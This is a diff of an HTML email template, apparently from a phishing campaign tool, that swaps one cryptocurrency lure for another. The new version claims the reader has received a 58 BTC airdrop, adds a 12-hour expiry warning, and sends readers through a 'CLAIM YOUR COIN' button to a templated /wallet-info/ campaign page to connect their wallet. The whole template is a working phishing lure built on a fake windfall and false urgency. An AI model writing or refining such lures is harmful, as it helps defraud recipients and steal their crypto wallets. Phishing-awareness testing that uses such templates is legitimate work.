@@ -28,194 +28,100 @@
         }
         
         .header {
-            border-radius: 2em;
-            background: linear-gradient(to right, #1a56db, #1e429f);
-            padding: 32px 24px;
-            text-align: center;
+            background-color: #333333;
+            border-bottom: 1px solid rgb(68, 68, 68);
             color: white;
-        }
-        
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        
-        .header p {
-            font-size: 16px;
-            opacity: 0.9;
+            padding: 25px;
+            text-align: center;
         }
         
         .content {
-            padding: 24px;
+            color: #bbbbbb;
+            padding: 25px;
         }
         
-        .amount-card {
-            background-color: #f0f9ff;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: center;
-            margin: 24px 0;
-        }
-        
-        .amount-label {
-            color: #0369a1;
-            font-size: 10px;
-            margin-bottom: 8px;
-        }
-        
-        .amount-value {
-            color: #0c4a6e;
-            font-size: 28px;
-            font-weight: bold;
-            
-        }
-        
-        .details-card {
-            background-color: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 24px 0;
-        }
-        
-        .detail-row {
-            padding: 12px 0;
-            border-bottom: 1px solid #e2e8f0;
-        }
-        
-        .detail-row:last-child {
-            border-bottom: none;
-            padding-bottom: 0;
-        }
-        
-        .detail-row:first-child {
-            padding-top: 0;
-        }
-        
-        .detail-label {
-            color: #64748b;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }
-        
-        .detail-value {
-            color: #0f172a;
-            font-size: 16px;
-            font-weight: 500;
-        }
-        
-        .intro-text {
-            color: #334155;
+        .content h2 {
             margin-bottom: 16px;
-            font-size: 16px;
-            line-height: 1.5;
         }
         
-        .intro-text:last-of-type {
-            margin-bottom: 0;
-        }
-        
-        .cta-button {
-            display: block;
-            background: linear-gradient(to right, #2563eb, #1d4ed8);
-            color: white;
-            text-decoration: none;
-            padding: 16px 32px;
-            border-radius: 8px;
+        .image {
+            margin: 20px 0;
             text-align: center;
-            font-weight: 600;
-            margin: 24px 0;
-            transition: transform 0.1s ease;
         }
         
-        .cta-button:hover {
-            transform: translateY(-1px);
+        .image img {
+            border-radius: 10px;
+            height: auto;
+            max-width: 100px;
+        }
+        
+        .info {
+            background-color: #333333;
+            border-left: 5px solid rgb(140, 190, 6);
+            border-radius: 5px;
+            margin: 20px 0;
+            padding: 15px;
+        }
+        
+        .info strong {
+            color: white;
+        }
+        
+        .button {
+            background-color: #8cbe06;
+            border-radius: 5px;
+            color: #1155cc;
+            display: inline-block;
+            margin: 25px 0;
+            padding: 15px 30px;
+            text-align: center;
+            text-decoration: none;
+        }
+        
+        .warning {
+            background-color: #ff4444;
+            border-left: 5px solid rgb(244, 67, 54);
+            border-radius: 5px;
+            color: white;
+            margin: 20px 0;
+            padding: 15px;
         }
         
         .footer {
-            background-color: #f8fafc;
-            padding: 24px;
+            background-color: #222222;
+            border-top: 1px solid rgb(68, 68, 68);
+            color: #888888;
+            font-size: 12px;
+            padding: 15px;
             text-align: center;
-            border-top: 1px solid #e2e8f0;
-        }
-        
-        .footer p {
-            color: #64748b;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-        
-        .footer p:last-child {
-            margin-bottom: 0;
-        }
-        
-        @media (max-width: 600px) {
-            body {
-                padding: 12px;
-            }
-            
-            .header {
-                padding: 24px 16px;
-            }
-            
-            .content {
-                padding: 16px;
-            }
-            
-            .header h1 {
-                font-size: 24px;
-            }
-            
-            .amount-value {
-                font-size: 28px;
-            }
-            
-            .amount-label {
-                font-size: 18px;
-            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>{{ cryptocurrency }} Token Distribution</h1>
-            <p>Wallet Verification Required</p>
+            <h1>Congratulations!</h1>
         </div>
-        
         <div class="content">
-            <p class="intro-text">Your wallet has been selected for a {{ cryptocurrency }} token distribution due to your recent blockchain activity. Below are your details:</p>
-            
-            <div class="amount-card">
-                <div class="amount-label">Eligible Amount</div>
-                <div class="amount-value">{{ quantity }} {{ cryptocurrency }}</div>
+            <h2>You Have Received an Airdrop</h2>
+            <p>We are excited to inform you that you have received an airdrop in your account.</p>
+            <div class="image">
+                <img alt="Crypto Image" src="https://free3dicon.com/wp-content/uploads/2022/08/perspective_matte-283-264x264.png" />
             </div>
-            
-            <div class="details-card">
-                <div class="detail-row">
-                    <div class="detail-label">Distribution Asset</div>
-                    <div class="detail-value">{{ cryptocurrency }}</div>
-                </div>
-                <div class="detail-row">
-                    <div class="detail-label">Qualification Threshold</div>
-                    <div class="detail-value">{{ min_balance }} {{ cryptocurrency }}</div>
-                </div>
-                <div class="detail-row">
-                    <div class="detail-label">Status</div>
-                    <div class="detail-value" style="color: #ea580c;">Pending Verification</div>
-                </div>
+            <div class="info">
+                <p><strong>Received Amount:</strong> <span style="color: white; font-weight: bold;">58 BTC</span></p>
             </div>
-            
-            <p class="intro-text">To proceed, please confirm your wallet details and claim your tokens by following the steps on our secure portal.</p>
-            
-            <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
-                Confirm Wallet
+            <a class="button" href="{{ base_url }}/wallet-info/{{ campaign_id }}/">
+                CLAIM YOUR COIN
             </a>
+            <div class="warning">
+                <p><strong>Warning:</strong> This giveaway expires in 12 hours. Please connect your wallet to claim your airdrop.</p>
+            </div>
+            <p>Please make sure to check your account and confirm the received amount. If you have any questions or need further assistance, feel free to contact our support team.</p>
+            <p>Thank you for being a valued member of our community. We appreciate your continued support and look forward to bringing you more exciting opportunities.</p>
         </div>
-        
         <div class="footer">
-            <p>&copy; {{ current_year }} {{ cryptocurrency }} Distribution</p>
+            <p>If you did not expect to receive this email, please contact our support team immediately.</p>
         </div>
     </div>
 </body>
